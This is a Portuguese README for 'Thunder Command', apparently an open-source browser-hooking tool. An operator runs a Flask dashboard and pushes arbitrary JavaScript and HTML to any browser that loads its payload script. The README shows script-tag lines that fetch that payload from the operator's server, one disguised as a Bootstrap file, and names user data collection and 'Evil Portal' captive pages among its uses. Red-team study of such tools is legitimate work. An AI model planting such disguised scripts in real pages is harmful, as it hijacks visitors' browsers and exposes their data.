<h1 align="center" style="color:red">
  <img src="./static/img/logo_banner_letras.png"   width="500">
  <br>
</h1>

<p align="center" style="font-size:12px">Referência ThunderCats: O Olho de Thundera é um item de poder, que concede visão além do mundo físico (Visão Além da Visão), permitindo que Lion-O amplia sua visão e revela perigos ocultos a grandes distâncias. <br><br></p>



# Thunder Command

Um sistema avançado de comunicação bidirecional entre servidor e cliente, permitindo que administradores executem comandos JavaScript e manipulem páginas web em tempo real, sem necessidade de atualização da página.

## Visão Geral

Thunder Command é uma ferramenta poderosa para controle remoto de páginas web que permite a administradores executar ações em tempo real em navegadores de clientes conectados. **A partir da versão 2.0, o sistema foi modernizado e utiliza exclusivamente HTTP polling** para comunicação, oferecendo maior compatibilidade e estabilidade. O sistema agora conta com persistência SQLite e interface administrativa aprimorada com HTMX.


## AVISO

#### Isenção de Responsabilidade: Uso Educacional e Estrutura Legal
As páginas de coleta fornecidas aqui são estritamente destinadas a fins educacionais e de treinamento. O objetivo é aumentar a conscientização sobre ameaças de segurança e ensinar os usuários a se proteger contra ataques de coleta.
Ao acessar essas páginas, você concorda em usá-las apenas dentro de uma estrutura legal e ética, em conformidade com as leis  e regulamentos aplicáveis em sua jurisdição.

#### Contexto de Estudos Técnicos
As páginas de coleta fornecidas neste repositório têm como objetivo apoiar profissionais de segurança em seus estudos e aprimoramento do cenário de cibersegurança, tudo dentro do contexto de construção de  um ambiente de simulação de ataque e defesa.

#### Limitação de Responsabilidade
O autor desta página se isenta de qualquer responsabilidade pelo uso malicioso ou ilegal dessas páginas de coleta. Qualquer pessoa que use essas páginas para fins não conformes à lei será a única responsável por suas ações. É altamente recomendável nunca usar essas técnicas para qualquer finalidade que não seja aprendizado e conscientização. O autor não monitora o uso dessas páginas após o download e transfere toda a responsabilidade ao usuário após o download.

---

<h1 align="center">
  <img src="./static/img/logo.png"   width="200">
</h1>

## Principais Funcionalidades

- **Comunicação HTTP polling exclusiva** - Sistema modernizado sem dependências WebSocket
- **Execução remota de JavaScript segura** com estratégias inteligentes de execução
- **Manipulação DOM robusta** com múltiplas estratégias de seleção (ID, classe, CSS selector)
- **Injeção dinâmica de HTML** diretamente no corpo das páginas
- **Controle de visibilidade** avançado de elementos na página
- **Persistência de dados SQLite** com repositórios para clientes e comandos
- **Dashboard administrativo HTMX** com atualizações parciais e componentes modulares
- **Sistema de logging completo** com diferentes níveis (app, command, auth)
- **Captura de resultados configurável** com métricas de performance
- **Suporte JSONP** para arquivos locais e contorno de restrições CORS
- **Persistência de IDs de clientes** via localStorage com limpeza automática
- **Interface administrativa responsiva** com Bootstrap 5.3.6
- **Parser integrado de User-Agent** com ícones de navegador e sistema operacional
- **Design moderno e responsivo** com tema escuro customizado
- **Gráficos em tempo real** usando Chart.js para métricas de conexão
- **URLs dinâmicas de payload** com IDs e nomes personalizáveis
- **Tratamento robusto de erros** em manipulação DOM e execução JavaScript

## Possíveis Cenários

<h1 align="center">
  <img src="./static/img/flow.png"   >
</h1>

## Arquitetura do Sistema (v2.0)

O sistema utiliza **exclusivamente HTTP polling** para comunicação entre servidor e cliente, oferecendo máxima compatibilidade e estabilidade:

```mermaid
graph TB
    %% Main Components
    Admin[Admin Dashboard] 
    Server[Flask Server - HTTP Polling Only]
    Clients[Client Browsers]
    DB[SQLite Database]
    
    %% Subcomponents
    subgraph "Admin Panel (HTMX)"
        AdminLogin[Login Authentication]
        AdminDashboard[Dashboard with HTMX]
        CommandBuilder[Command Builder Interface]
        ClientMonitor[Real-time Client Monitor]
        CommandLogs[Command History & Results]
        StatsCharts[Charts.js Metrics]
    end
    
    subgraph "Server Components (Flask)"
        HTTPPolling[HTTP Polling Manager]
        AuthModule[Session Authentication]
        CommandStorage[Command Repository]
        ClientRegistry[Client Repository]
        ResultCapture[Result Capture System]
        LoggingSystem[Multi-level Logging]
    end
    
    subgraph "Database Layer (SQLite)"
        ClientTable[clients table]
        CommandTable[commands table] 
        ResultsTable[command_results table]
    end
    
    subgraph "Client Components"
        PollingClient[HTTP Polling Client]
        CommandExecutor[Smart JS Executor]
        ClientIdentifier[Client ID Generator/Storage]
        SafeDOM[Safe DOM Manipulation]
        ResultSender[Result Sender (JSONP)]
    end
    
    %% Authentication Flow
    AdminLogin -->|Credentials| AuthModule
    AuthModule -->|Session Token| AdminDashboard
    
    %% Command Flow (HTTP Polling)
    CommandBuilder -->|Creates Command| CommandStorage
    CommandStorage -->|Stores in DB| ClientTable
    CommandStorage -->|Caches Command| Server
    Server -->|Serves on Poll| HTTPPolling
    HTTPPolling -->|Command Response| PollingClient
    PollingClient -->|Execute| CommandExecutor
    
    %% Database Operations
    CommandStorage <-->|Read/Write| CommandTable
    ClientRegistry <-->|Read/Write| ClientTable
    ResultCapture <-->|Store Results| ResultsTable
    
    %% Client Management Flow
    Clients -->|Register/Heartbeat| ClientRegistry
    ClientRegistry -->|Updates Dashboard| ClientMonitor
    ClientIdentifier -->|Persistent ID| ClientRegistry
    
    %% Safe Command Execution
    CommandExecutor -->|Multi-Strategy Selection| SafeDOM
    SafeDOM -->|JS Execution| JSExec[JavaScript Execution]
    SafeDOM -->|DOM Manipulation| DOMManip[Safe DOM Manipulation]
    SafeDOM -->|HTML Injection| HTMLInject[HTML Injection]
    SafeDOM -->|Element Visibility| Visibility[Visibility Control]
    
    %% Result Flow
    CommandExecutor -->|Send Results| ResultSender
    ResultSender -->|POST/JSONP| ResultCapture
    ResultCapture -->|Store & Log| LoggingSystem
    ResultCapture -->|Update Dashboard| StatsCharts
    
    %% HTMX Updates
    AdminDashboard -->|Partial Updates| StatsCharts
    AdminDashboard -->|Real-time Data| ClientMonitor
    AdminDashboard -->|Log Updates| CommandLogs
    
    %% Styling
    classDef adminNode fill:#722F37,stroke:#722F37,color:#fff
    classDef serverNode fill:#1A1A2E,stroke:#16213E,color:#fff
    classDef clientNode fill:#0F3460,stroke:#0F3460,color:#fff
    classDef dbNode fill:#2D5AA0,stroke:#2D5AA0,color:#fff
    classDef execNode fill:#950740,stroke:#950740,color:#fff
    
    class Admin,AdminLogin,AdminDashboard,CommandBuilder,ClientMonitor,CommandLogs,StatsCharts adminNode
    class Server,HTTPPolling,AuthModule,CommandStorage,ClientRegistry,ResultCapture,LoggingSystem serverNode
    class Clients,PollingClient,CommandExecutor,ClientIdentifier,SafeDOM,ResultSender clientNode
    class DB,ClientTable,CommandTable,ResultsTable dbNode
    class JSExec,DOMManip,HTMLInject,Visibility execNode
```

## Estrutura do Projeto

```
ThunderCommand/
├── app.py                                # Servidor Flask principal - HTTP polling only (v2.0)
├── CLAUDE.md                             # Documentação técnica para desenvolvimento
├── core/                                 # Módulos principais do sistema
│   ├── database.py                       # Conexão SQLite e repositórios (ClientRepository, CommandRepository)
│   └── utils/
│       ├── logger.py                     # Sistema de logging multi-nível (app, command, auth)
│       └── helpers.py                    # Utilitários auxiliares
├── exemples/                             # Diretório com exemplos de implementação
│   ├── template.html                     # Template básico para integração em outros projetos
│   └── wifi.html                         # Exemplo de página para utilização em captive portals
├── payload/                              # Scripts cliente para execução remota
│   └── cmd.js                           # Cliente HTTP polling com estratégias inteligentes de execução
├── README.md                             # Documentação completa do projeto (você está aqui)
├── requirements.txt                      # Dependências Python (Flask, SQLAlchemy, sem Socket.IO)
├── static/                               # Recursos estáticos do aplicativo
│   ├── css/                             # Estilos do aplicativo
│   │   ├── custom-dark-red.css          # Tema escuro atual (v2.0)
│   │   ├── custom-dark-red.scss         # Fonte SCSS do tema escuro
│   │   └── olho-tandera.css             # Tema original (legado)
│   ├── favicon.ico                      # Ícone do site para a barra de navegação
│   ├── img/                             # Diretório de imagens e screenshots
│   │   ├── admin.png                    # Screenshot do painel de administração v2.0
│   │   ├── cliente.png                  # Screenshot da página cliente
│   │   ├── flow.png                     # Diagrama de fluxo do sistema
│   │   ├── login.png                    # Screenshot da página de login
│   │   ├── logo_banner_letras.png       # Logo com texto para cabeçalhos
│   │   ├── logo_banner.png              # Banner do logo para documentação
│   │   └── logo.png                     # Logo principal do projeto
│   └── js/                              # Scripts JavaScript do frontend
│       ├── browser-os-icons.js          # Utilitário para ícones de navegadores e sistemas operacionais
│       ├── console-terminal.js          # Interface de console estilo terminal
│       ├── table-fixes-consolidated.js  # Correções e melhorias para tabelas
│       ├── table-interactions.js        # Funcionalidades interativas para tabelas
│       ├── table-pagination.js          # Paginação de tabelas para múltiplos clientes
│       └── user-agent-parser.js         # Parser de User-Agent para identificação
├── templates/                           # Templates HTML do aplicativo
│   ├── admin-dashboard.html             # Dashboard principal com HTMX (v2.0)
│   ├── login.html                       # Página de autenticação para acesso ao painel
│   ├── server_to_client.html            # Página cliente que recebe comandos
│   └── partials/                        # Componentes HTMX modulares (v2.0)
│       ├── card_stats.html              # Cards de estatísticas com gráficos
│       ├── capture_toggle.html          # Toggle de captura de resultados
│       ├── clients_table.html           # Tabela de clientes conectados
│       ├── dashboard_stats.html         # Estatísticas do dashboard
│       ├── form_command_table.html      # Interface de envio de comandos
│       ├── head.html                    # Cabeçalho HTML comum
│       ├── header.html                  # Cabeçalho da página
│       ├── logs_content.html            # Conteúdo de logs
│       ├── logs_table.html              # Tabela de logs de comandos
│       └── sidebar.html                 # Barra lateral de navegação
└── thunder_command.db                   # Banco de dados SQLite (gerado automaticamente)
```

## Instalação e Configuração

### Pré-requisitos

- Python 3.8+ (testado com Python 3.13)
- pip (gerenciador de pacotes do Python)
- Flask e SQLAlchemy (sem dependências WebSocket)

### Instalação

1. Clone o repositório ou baixe os arquivos
2. Instale as dependências do projeto:

```bash
pip install -r requirements.txt
```

3. Execute o servidor Flask:

```bash
python app.py
```

4. Acesse as páginas no navegador:
   - Cliente: `http://localhost:5000/`
   - Administração: `http://localhost:5000/admin` (credenciais padrão: `tandera`/`tandera`)

### Configuração via Variáveis de Ambiente

Para melhorar a segurança, você pode configurar as credenciais de administrador e outras configurações via variáveis de ambiente:

```bash
export SECRET_KEY="sua_key"
export ADMIN_USERNAME="seu_usuario_admin"
export ADMIN_PASSWORD="sua_senha_admin"
python app.py
```
### SCREENSHOTS

<img src="./static/img/login.png"> 

<img src="./static/img/cliente.png">

<img src="./static/img/admin.png">


## Como Usar

### Painel de Administração

O painel administrativo moderno oferece várias opções para enviar comandos:

1. **Inject JavaScript**: Execute código JavaScript personalizado na página cliente
   ```javascript
   alert('Olá do servidor!');
   ```

2. **Inject HTML**: Adicione conteúdo HTML ao final da página cliente
   ```html
   <div class="notification">Nova mensagem importante!</div>
   ```

3. **Manipular Elemento**: Modifique elementos específicos por ID
   - **Adicionar**: Acrescenta conteúdo ao final do elemento
   - **Substituir**: Substitui completamente o conteúdo do elemento
   - **Inserir Abaixo/Acima**: Adiciona conteúdo depois/antes do elemento

4. **Visibilidade do Elemento**: Mostre ou oculte elementos por ID

5. **Manipular Head**: Modifique o cabeçalho da página
   - Adicione CSS externo ou inline
   - Adicione JavaScript externo ou inline
   - Adicione meta tags

### Gerenciamento de Clientes

- O painel exibe todos os clientes ativos com informações detalhadas em tempo real
- Detecção e exibição automática de navegador e sistema operacional
- **Todos os clientes utilizam conexão HTTP polling** (tipo de conexão unificado)
- Clientes inativos por mais de 30 minutos são automaticamente removidos
- Visualização detalhada de informações do cliente com métricas de performance
- Comandos podem ser direcionados a clientes específicos ou broadcast para todos
- **Dashboard atualizado via HTMX** com componentes modulares

### Histórico de Logs e Resultados

- O sistema mantém histórico dos últimos 1000 comandos enviados (configurável)
- **Persistência SQLite** para armazenamento permanente de logs e resultados
- Para cada comando são registrados: data/hora, tipo, conteúdo, cliente-alvo e resultados
- **Captura de resultados configurável** com métricas de execução detalhadas
- Interface HTMX para visualização em tempo real de logs e estatísticas
- Sistema de logging multi-nível (app, commands, auth) para debugging

## Integrando Payload JavaScript

Para integrar o sistema em páginas existentes, basta incluir o script cliente:

**A instância do payload.js garante a execução em uma página remota hospedada em outro servidor ou no cliente que baixa o arquivo .html em sua máquina.**

O sistema disponibiliza um esquema de **ID** e **nome de arquivo** dinâmicos, os arquivos de payload devem terminar com a extenção **.js** ou **.map**
- `http://server:5000/<int>/<string>.js`
- `http://server:5000/<int>/<string>.map`

Exemplos:
```html
<!-- Adicionar antes do fechamento do </body> -->
<script src="http://seu-servidor:5000/1/poc.js"></script>

<script src="http://seu-servidor:5000/12345/teste.js"></script>

<script src="http://seu-servidor:5000/99999/bootstrap.bundle.min.js"></script>

<script src="http://seu-servidor:5000/99999/bootstrap.bundle.min.map"></script>

<script src="http://seu-servidor:5000/2025/payload-campanha-redteam.js"></script>
```



O sistema irá:
1. Gerar automaticamente um ID único para o cliente (localStorage)
2. Iniciar polling HTTP automático para verificar novos comandos
3. Registrar cliente no servidor com informações de user-agent e IP
4. Executar comandos recebidos usando estratégias inteligentes de execução
5. Enviar resultados de volta ao servidor (se captura estiver habilitada)
6. Manter conexão ativa através de heartbeat polling

## Segurança

**Atenção**: Este sistema foi projetado para ambientes controlados e possui aspectos que devem ser considerados:

- O sistema permite a execução de código JavaScript arbitrário
- Use sempre autenticação para o painel administrativo
- Não utilize em ambientes públicos sem medidas de segurança adicionais

## Arquitetura Técnica (v2.0)

### Backend (Flask Puro + SQLite)

- **Comunicação exclusiva via HTTP polling** - sem dependências WebSocket
- **Persistência SQLite** com padrão Repository para clientes e comandos
- **API REST em Flask** com endpoints para polling, resultados e administração
- **Sistema de autenticação baseado em sessões** para o painel administrativo
- **Cache híbrido** - dados em memória para performance + persistência para durabilidade
- **Limpeza automática** de clientes inativos (configurável, padrão 30 minutos)
- **Sistema de logging estruturado** com diferentes níveis (app, command, auth)

### Cliente (Polling Inteligente)

- **HTTP polling exclusivo** com intervalos otimizados para performance
- **Suporte JSONP completo** para arquivos locais e contorno de CORS
- **Estratégias inteligentes de execução** - detecção automática de expressões vs declarações
- **Manipulação DOM segura** com múltiplas estratégias de seleção de elementos
- **Tratamento robusto de erros** com feedback detalhado para o servidor
- **Persistência de ID de cliente** via localStorage com geração automática
- **Envio de resultados configurável** com métricas de performance (tempo de execução)

### Admin (Dashboard Moderno com HTMX)

- **Interface Bootstrap 5.3.6** com tema escuro personalizado
- **Componentes HTMX modulares** para atualizações parciais sem JavaScript complexo
- **Gráficos Chart.js em tempo real** para métricas de conexão e atividade
- **Editor de código integrado** para inserção de JavaScript e HTML
- **Parser de User-Agent avançado** com ícones de navegadores e sistemas operacionais
- **Feedback visual em tempo real** sobre estado dos clientes e execução de comandos
- **Sistema de toggle configurável** para captura de resultados
- **Arquitetura de template componentizada** (partials/) para manutenibilidade

## Melhorias e Correções na v2.0

### Correções de Bugs Críticos
- **Manipulação DOM segura**: Corrigido erro "can't access property 'innerHTML', element is undefined" 
- **Execução JavaScript**: Resolvido problema de comandos sempre retornando `undefined`
- **Sintaxe JavaScript**: Corrigido tratamento de quebras de linha em literais de string
- **Dashboard metrics**: Restaurado funcionamento dos gráficos "Tipos de Conexão" e "Atividade de Clientes"

### Modernização Arquitetural
- **Remoção completa do WebSocket**: Migração para HTTP polling exclusivo para maior compatibilidade
- **Integração HTMX**: Interface administrativa modernizada com componentes reativos
- **Persistência SQLite**: Todos os dados agora persistem permanentemente no banco
- **Sistema de repositórios**: Separação clara entre lógica de negócio e acesso a dados

### Funcionalidades Removidas
- **Sistema de preview**: Removido completamente conforme solicitado pelos usuários
- **Dependências Socket.IO**: Limpeza completa de código legado WebSocket
- **Arquivos de teste**: Remoção de arquivos temporários de desenvolvimento

### Segurança e Estabilidade
- **Seleção de elementos multi-estratégia**: ID → classe → CSS selector para robustez
- **Tratamento de erros aprimorado**: Feedback detalhado em todas as operações DOM
- **Limpeza automática de recursos**: Remoção automática de clientes inativos
- **Logging estruturado**: Sistema de logs detalhado para debugging e monitoramento

## Casos de Uso

- Coleta informacional de dados em tempo real de usuários
- Operação de Redteam
- Contexto Educacional
- Incrementar paginas de portal captive [Evil Portal](https://github.com/MrCl0wnLab/BR-EvilPortal-HTML-Files)
- Modificação dinâmica de páginas em produção
- Notificações em tempo real para usuários
- Correção de bugs em páginas em produção sem necessidade de redeploy
- Testes A/B dinâmicos
- Adaptação da interface baseada em eventos do servidor
- Mensagens de manutenção temporárias
- Sistemas interativos em tempo real



<h1 align="center" style="color:red">
  <img src="./static/img/logo_banner.png"   width="200">
  <br>
</h1>


## Desenvolvido por 🛠️ <a name="autores"></a>

- **Cleiton P. (MrCl0wn Security Lab)** - [Twitter](https://twitter.com/MrCl0wnLab), [Git](https://github.com/MrCl0wnLab), [Blog](https://blog.mrcl0wn.com/)


---

## Contribuições ✨ <a name="contribuicoes"></a>
Contribuições de qualquer tipo são bem-vindas!

<a href="https://github.com/MrCl0wnLab/ThunderCommand/graphs/contributors">
  <img src="https://contributors-img.web.app/image?repo=MrCl0wnLab/ThunderCommand&max=500" alt="Lista de contribuidores" width="10%"/>
</a>

---

### Changelog v2.0
- **Data**: Agosto 2025
- **Principais mudanças**: Migração completa para HTTP polling, remoção do WebSocket, persistência SQLite, HTMX, correções de bugs críticos
- **Compatibilidade**: Quebra compatibilidade com versões anteriores que dependiam de Socket.IO
- **Status**: Versão estável para produção em ambientes controlados